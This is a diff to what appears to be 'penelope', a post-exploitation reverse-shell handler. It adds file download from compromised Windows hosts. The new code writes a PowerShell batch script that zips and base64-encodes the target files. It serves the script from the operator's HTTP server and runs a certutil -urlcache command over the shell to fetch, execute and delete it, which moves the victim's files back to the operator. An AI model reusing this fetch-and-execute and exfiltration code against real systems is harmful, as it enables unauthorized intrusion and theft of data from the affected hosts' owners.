@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.11.10"
+__version__ = "0.11.11"
 
 import os
 import io
@@ -2395,30 +2395,30 @@ class Session:
 			logger.error(e)
 			return []
 
-		# Check for local available space
-		available_bytes = shutil.disk_usage(local_download_folder).free
-		if self.agent:
-			block_size = os.statvfs(local_download_folder).f_frsize
-			remote_size = int(float(self.exec(f"{inspect.getsource(get_glob_size)}"
-				f"stdout_stream << str(get_glob_size(r'{remote_items}', {block_size})).encode()", python=True, value=True, preserve_dir=True)))
-		else:
-			cmd = f"du -ck {remote_items}"
-			response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
-			#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
-			#for error in errors:
-			#	logger.error(error)
-			remote_size = int(response.splitlines()[-1].split()[0]) * 1024
-
-		need = remote_size - available_bytes
-
-		if need > 0:
-			logger.error(
-				f"--- Not enough space to download... {paint('We need ').blue}"
-				f"{paint().yellow}{need:,}{paint().blue} more bytes..."
-			)
-			return []
-
 		if self.OS == 'Unix':
+			# Check for local available space
+			available_bytes = shutil.disk_usage(local_download_folder).free
+			if self.agent:
+				block_size = os.statvfs(local_download_folder).f_frsize
+				remote_size = int(float(self.exec(f"{inspect.getsource(get_glob_size)}"
+					f"stdout_stream << str(get_glob_size(r'{remote_items}', {block_size})).encode()", python=True, value=True, preserve_dir=True)))
+			else:
+				cmd = f"du -ck {remote_items}"
+				response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
+				#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
+				#for error in errors:
+				#	logger.error(error)
+				remote_size = int(response.splitlines()[-1].split()[0]) * 1024
+
+			need = remote_size - available_bytes
+
+			if need > 0:
+				logger.error(
+					f"--- Not enough space to download... {paint('We need ').blue}"
+					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
+				)
+				return []
+
 			# Packing and downloading
 			if self.agent:
 				stdout_stream = self.new_streamID
@@ -2530,44 +2530,47 @@ class Session:
 				else:
 					logger.error(f"{paint('Download Failed').RED_white} => {local_path}")
 
-			for item in downloaded:
-				logger.info(f"{paint('Downloaded').GREEN_white} => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO
-
-			return downloaded
-
 		elif self.OS == 'Windows':
-			'''tempfile = f"{self.tmp}\\{rand(10)}.zip"
-
-			#cmd = f"certutil -encode {remote_items} {tempfile} > nul && type {tempfile} && del {tempfile}"
-			#data = base64.b64decode(b''.join(data.splitlines()[2:-1]))
-			#cmd = psh
-
+			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
+			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
+			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
 			cmd = (
-				f'powershell -command "compress-archive -path \\"{remote_items}\\" -DestinationPath \\"{tempfile}\\"";'
+				f'@powershell -command "$archivepath=\\"{remote_tempfile}\\";compress-archive -path \\"{remote_items_ps}\\"'
+				' -DestinationPath $archivepath;'
 				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
 				'Remove-Item $archivepath;'
 				'Write-Host $b64"'
-
 			)
+			with open(tempfile_bat, "w") as f:
+				f.write(cmd)
 
-			#print(cmd)
+			server = FileServer(host=self._host, password=rand(8), quiet=True)
+			urlpath_bat = server.add(tempfile_bat)
+			temp_remote_file_bat = urlpath_bat.split("/")[-1]
+			server.start()
+			data = self.exec(
+				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
+				value=True, timeout=None)
+			server.stop()
 
-			data = self.exec(cmd)
-
+			downloaded = set()
 			try:
 				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
 					for item in zipdata.infolist():
 						item.filename = item.filename.replace('\\', '/')
+						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
 						newpath = Path(zipdata.extract(item, path=local_download_folder))
-						logger.info(f"Downloaded => {paint(shlex.quote(pathlink(newpath))).yellow}")
 
 			except zipfile.BadZipFile:
 				logger.error("Invalid zip format")
 
 			except binascii.Error:
-				logger.error("The item does not exist or access is denied")'''
+				logger.error("The item does not exist or access is denied")
 
-			logger.warning("Download on Windows shells is not implemented yet")
+		for item in downloaded:
+			logger.info(f"{paint('Downloaded').GREEN_white} => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO
+
+		return downloaded
 
 	def upload(self, local_items, remote_path=None, randomize_fname=False):
 
